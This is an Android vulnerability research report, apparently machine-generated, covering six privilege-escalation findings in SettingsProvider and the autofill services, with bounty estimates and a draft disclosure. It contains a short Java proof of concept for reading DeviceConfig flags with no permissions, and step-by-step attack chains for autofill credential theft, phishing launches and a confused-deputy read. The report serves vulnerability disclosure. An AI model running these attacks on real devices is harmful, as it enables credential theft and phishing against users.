# Report 43: Round 32 — EoP: SettingsProvider DeviceConfig Read, Autofill BAL/Session Merge, Ringtone Confused Deputy

**Date**: 2026-04-30  
**Scope**: SettingsProvider, AutofillManagerService, AutofillSession  
**Method**: Deep background agents + manual source verification  
**Previous**: Reports 01-42, ~415 variants

---

## Part A: SettingsProvider (3 findings)

### V-415: Zero-Permission DeviceConfig Flag Read — Security Feature State Disclosure [MEDIUM-HIGH/Info → EoP Enabler]

**File**: `packages/providers/SettingsProvider/src/com/android/providers/settings/SettingsProvider.java` (lines 437-440, 1169-1178)

**Issue**: The `call()` method handles `CALL_METHOD_GET_CONFIG`, `CALL_METHOD_LIST_CONFIG`, and `CALL_METHOD_LIST_NAMESPACES_CONFIG` with **zero server-side permission enforcement**. The client-side `@RequiresPermission(READ_DEVICE_CONFIG)` annotation is only a lint check — not enforced at runtime. `ContentProvider.Transport.call()` does NOT enforce AppOps or read/write permissions for the `call()` method.

```java
// SettingsProvider.java line 437-440:
case Settings.CALL_METHOD_GET_CONFIG -> {
    Setting setting = getConfigSetting(name);  // NO permission check!
    return packageValueForCallResult(SETTINGS_TYPE_CONFIG, name, requestingUserId, setting, ...);
}
```

`getConfigSetting()` (line 1169) directly reads from the settings store with no permission enforcement. Similarly `getAllConfigFlags()` and `getAllConfigFlagNamespaces()`.

**PoC**:
```java
// Read any DeviceConfig flag without READ_DEVICE_CONFIG permission:
Bundle result = getContentResolver().call(
    Uri.parse("content://settings"),
    "GET_config",
    "privacy/device_identifier_access_restrictions_enabled",
    null
);
String value = result.getString("value");

// Enumerate all DeviceConfig namespaces:
Bundle ns = getContentResolver().call(
    Uri.parse("content://settings"),
    "LIST_NAMESPACES_config",
    null, null
);
```

**Attack**:
1. Zero-permission app reads DeviceConfig flags from all namespaces
2. Discovers security feature kill switches (e.g., `privacy/device_identifier_access_restrictions_enabled = false`)
3. Discovers A/B test configurations and internal rollout percentages
4. Uses knowledge of disabled security features to craft targeted exploits
5. For example: if BAL restrictions are disabled via flag, proceed with background activity attack

**Permission**: ZERO  
**Impact**: Complete DeviceConfig disclosure — security feature state, rollout configurations, internal flags  
**Bounty**: $3,000-$10,000

---

### V-416: Ringtone Cache Confused Deputy — System-Identity Content URI Read [MEDIUM/EoP]

**File**: `SettingsProvider.java` (lines 806-834, 2065-2078)

**Issue**: When an app with `WRITE_SETTINGS` permission sets ringtone/notification/alarm settings to a content URI, system_server reads from that URI using its own elevated identity and caches the result to a file. The cache file is then accessible via `openFile()` with NO read permission check:

```java
// Line 2070-2073 (within mutateSystemSetting):
Binder.withCleanCallingIdentity(() -> {
    try (InputStream in = openRingtone(getContext(), ringtoneUri);
         OutputStream out = new FileOutputStream(cacheFile)) {
        FileUtils.copy(in, out);
    }
});

// Line 806-834 (openFile - NO read permission check):
public ParcelFileDescriptor openFile(Uri uri, String mode) {
    if (mode.contains("w") && !Settings.checkAndNoteWriteSettingsOperation(...)) { ... }
    // Read mode: NO PERMISSION CHECK — any app can read the cached file
    return ParcelFileDescriptor.open(cacheFile, ParcelFileDescriptor.parseMode(mode));
}
```

**Attack**:
1. Malicious app with `WRITE_SETTINGS` (user-grantable) sets ringtone to a content URI from a permission-protected provider
2. System reads from that URI using system identity (bypassing the provider's permission checks)
3. Content is cached to a file
4. Attacker reads the cache file via `openFile()` — no permission needed for read
5. Attacker obtains content from a provider it couldn't directly access

**Mitigation**: `isValidMediaUri()` requires the target URI to return audio/* or video/* MIME type. This limits exploitation to ContentProviders serving media with restricted access.

**Permission**: `WRITE_SETTINGS` (user-grantable via Settings UI)  
**Impact**: Read arbitrary media-type content from permission-protected providers via system identity  
**Bounty**: $2,000-$5,000

---

### V-417: Legacy Apps (SDK ≤ 22) Can Write PRIVATE System Settings Including LOCKSCREEN_DISABLED [LOW-MEDIUM/EoP]

**File**: `SettingsProvider.java` (lines 2578-2596)

**Issue**: Apps targeting SDK ≤ LOLLIPOP_MR1 (22) with `WRITE_SETTINGS` can write to ANY Settings.System setting including `PRIVATE_SETTINGS`:

```java
// Line 2581-2588:
if (targetSdkVersion <= Build.VERSION_CODES.LOLLIPOP_MR1) {
    Slog.w(LOG_TAG, "You shouldn't not change private system settings.");
    // NOTE: No exception thrown - write proceeds!
}
```

Can write to `LOCKSCREEN_DISABLED`, `POINTER_LOCATION`, `SHOW_TOUCHES`, `SHOW_KEY_PRESSES` and other private settings. While `LOCKSCREEN_DISABLED` is actually read from LockSettings service (not Settings.System), `POINTER_LOCATION` and `SHOW_TOUCHES` enable on-screen touch visualization that could be used for shoulder-surfing assistance.

**Permission**: `WRITE_SETTINGS` (user-grantable) + target SDK ≤ 22  
**Impact**: Enable touch visualization for remote shoulder-surfing; modify private system settings  
**Bounty**: $500-$1,500

---

## Part B: AutofillManagerService (3 findings)

### V-418: Autofill Service BAL via BIND_ALLOW_BACKGROUND_ACTIVITY_STARTS + Authentication IntentSender [MEDIUM-HIGH/EoP]

**File**: `services/autofill/java/com/android/server/autofill/RemoteFillService.java`, `AutofillClientController.java`

**Issue**: The autofill service is bound with `BIND_ALLOW_BACKGROUND_ACTIVITY_STARTS`:

```java
// RemoteFillService.java:
super(context, new Intent(AutofillService.SERVICE_INTERFACE).setComponent(componentName),
    Context.BIND_ALLOW_BACKGROUND_ACTIVITY_STARTS  // BAL privilege!
        | (bindInstantServiceAllowed ? Context.BIND_ALLOW_INSTANT : 0),
    userId, IAutoFillService.Stub::asInterface);
```

Combined with the authentication flow:
```java
// AutofillClientController.java:
ActivityOptions activityOptions = ActivityOptions.makeBasic()
    .setPendingIntentBackgroundActivityStartMode(
        ActivityOptions.MODE_BACKGROUND_ACTIVITY_START_ALLOWED);
mActivity.startIntentSenderForResult(intent, AUTO_FILL_AUTH_WHO_PREFIX,
    authenticationId, fillInIntent, 0, 0, activityOptions.toBundle());
```

No validation of the `IntentSender` target is performed before launching. The autofill service can trigger this from background via delayed responses or save callbacks.

**Attack**:
1. Malicious app becomes autofill service (user selects in Settings)
2. Returns `FillResponse` with authentication `IntentSender` pointing to phishing activity
3. System launches the activity with `MODE_BACKGROUND_ACTIVITY_START_ALLOWED`
4. Activity launches even when victim app is in background
5. Phishing activity overlays the victim app

**Permission**: Must be selected as autofill service (user action in Settings)  
**Impact**: Background Activity Launch bypass — can launch arbitrary activities from background  
**Bounty**: $2,000-$5,000

---

### V-419: Cross-App Credential Leakage via Task-Scoped Session Merge (No UID Check) [MEDIUM-HIGH/EoP]

**File**: `services/autofill/java/com/android/server/autofill/AutofillManagerServiceImpl.java`

**Issue**: `getPreviousSessionsLocked` returns sessions from ANY app within the same task — filtering only by `taskId` with **no UID or package name check**:

```java
ArrayList<Session> getPreviousSessionsLocked(@NonNull Session session) {
    for (int i = 0; i < size; i++) {
        final Session previousSession = mSessions.valueAt(i);
        if (previousSession.taskId == session.taskId && previousSession.id != session.id
                && (previousSession.getSaveInfoFlagsLocked() & SaveInfo.FLAG_DELAY_SAVE) != 0) {
            previousSessions.add(previousSession);  // No UID check!
        }
    }
}
```

The code has an acknowledged TODO: `"// TODO(b/113281366): remove returned sessions / add CTS test"`.

`findValueFromThisSessionOnlyLocked` returns raw user-typed values from ViewState — passwords, usernames, form data from ANY app sharing the task.

**Attack**:
1. Malicious autofill service sets `FLAG_DELAY_SAVE` on victim app's session
2. Victim enters credentials in app A (session A created in task T)
3. App A launches app B in same task (no FLAG_ACTIVITY_NEW_TASK)
4. App B triggers autofill → during save flow, system merges session A's data
5. Autofill service receives combined save data including app A's raw credentials
6. Credentials exfiltrated without user awareness

**Permission**: Must be selected as autofill service  
**Impact**: Cross-app credential exfiltration within shared task without user consent  
**Bounty**: $3,000-$7,000

---

### V-420: Mutable System PendingIntent for Delayed Fill — Extra Injection with System Identity [MEDIUM/EoP]

**File**: `services/autofill/java/com/android/server/autofill/Session.java`

**Issue**: The delayed fill mechanism creates a mutable PendingIntent under system identity:

```java
private PendingIntent createPendingIntent(int requestId) {
    final long identity = Binder.clearCallingIdentity();
    try {
        Intent intent = new Intent(ACTION_DELAYED_FILL)
            .setPackage("android")
            .putExtra(EXTRA_REQUEST_ID, requestId);
        pendingIntent = PendingIntent.getBroadcast(
            mContext, this.id, intent,
            PendingIntent.FLAG_MUTABLE | PendingIntent.FLAG_ONE_SHOT  // MUTABLE!
                | PendingIntent.FLAG_CANCEL_CURRENT);
    } finally {
        Binder.restoreCallingIdentity(identity);
    }
}
```

Created with `FLAG_MUTABLE` under system identity. The autofill service receives this PendingIntent's `IntentSender` and can modify extras when sending (including injecting a crafted `FillResponse` via `EXTRA_FILL_RESPONSE`). The broadcast receiver validates only the action string.

**Permission**: Must be selected as autofill service  
**Impact**: Arbitrary fill response injection via mutable system PendingIntent  
**Bounty**: $1,000-$3,000

---

## Part C: Confirmed Secure (Audit Negative Results)

| Service | Result |
|---------|--------|
| SettingsProvider Settings.Secure/Global write | Properly requires WRITE_SECURE_SETTINGS |
| SettingsProvider cross-user access | Properly gated by INTERACT_ACROSS_USERS |
| ContactsProvider SQL injection | SqlChecker validates selections and projections |
| ContactsProvider cross-user | Properly gated + enterprise policy guard |
| SmsProvider read without READ_SMS | AppOps enforcement blocks |
| MmsProvider path traversal | Fixed (CVE-2022-20473) |
| Autofill cross-user session access | Per-user AutofillManagerServiceImpl prevents |
| Autofill session ID brute-force | Random positive int with collision detection |

---

## Round 32 Summary

| Severity | Count | Key Findings |
|----------|-------|-------------|
| MEDIUM-HIGH | 3 | DeviceConfig zero-perm read (V-415), Autofill BAL (V-418), Cross-app session merge (V-419) |
| MEDIUM | 2 | Ringtone confused deputy (V-416), Mutable PI injection (V-420) |
| LOW-MEDIUM | 1 | Legacy settings write (V-417) |
| **Total** | **6** | |

**Estimated bounty this round**: $11,500 - $31,500

---

## Cumulative Project Statistics (Reports 01-43)

| Metric | Previous | This Round | Cumulative |
|--------|----------|------------|------------|
| Total variants | ~415 | +6 | **~421** |
| HIGH/CRITICAL | ~57 | +0 | **~57** |
| Bounty estimate (low) | $805.4k | +$11.5k | **$816.9k** |
| Bounty estimate (high) | $2.014M | +$31.5k | **$2.046M** |

---

## V-415 VRP Report Draft

### Title: Zero-Permission DeviceConfig Flag Enumeration via SettingsProvider call() Method — Security Feature State Disclosure

### Summary
Any app without any permissions can read all DeviceConfig flags by calling `getContentResolver().call(Uri.parse("content://settings"), "GET_config", "namespace/flag_name", null)`. The server-side SettingsProvider `call()` method handler for `CALL_METHOD_GET_CONFIG` performs no permission verification. The `@RequiresPermission(READ_DEVICE_CONFIG)` annotation on the client API is a compile-time lint check only — not enforced at runtime. This enables complete enumeration of DeviceConfig namespaces, flags, and values.

### Root Cause
`SettingsProvider.call()` dispatches `CALL_METHOD_GET_CONFIG`/`CALL_METHOD_LIST_CONFIG`/`CALL_METHOD_LIST_NAMESPACES_CONFIG` directly to the config settings store without calling `enforceHasAtLeastOnePermission()` or any other permission check. The framework `ContentProvider.Transport.call()` does not enforce read/write permissions for the `call()` method — only `query()`/`insert()`/`update()`/`delete()` paths are protected.

### Steps to Reproduce
```java
// In any app with ZERO permissions:

// 1. List all DeviceConfig namespaces
Bundle namespaces = getContentResolver().call(
    Uri.parse("content://settings"),
    "LIST_NAMESPACES_config", null, null);

// 2. Read any specific flag
Bundle result = getContentResolver().call(
    Uri.parse("content://settings"),
    "GET_config",
    "privacy/device_identifier_access_restrictions_enabled",
    null);
String value = result.getString("value");

// 3. List all flags in a namespace
Bundle flags = getContentResolver().call(
    Uri.parse("content://settings"),
    "LIST_config",
    "privacy",
    null);
```

### Impact
- Complete disclosure of all DeviceConfig flags to any installed app
- Reveals security feature enablement state (allowing targeted exploitation when features are disabled)
- Reveals A/B test configurations and internal rollout decisions
- Enables device fingerprinting via unique flag combinations
- Enables targeted attacks: if attacker learns that a specific security feature flag is disabled on the target device, they can exploit the corresponding unprotected path

### Severity
MEDIUM-HIGH (Zero-permission information disclosure that enables targeted exploitation)

---

*Generated by FuzzMind/CoreBreaker Round 32 — 2026-04-30*
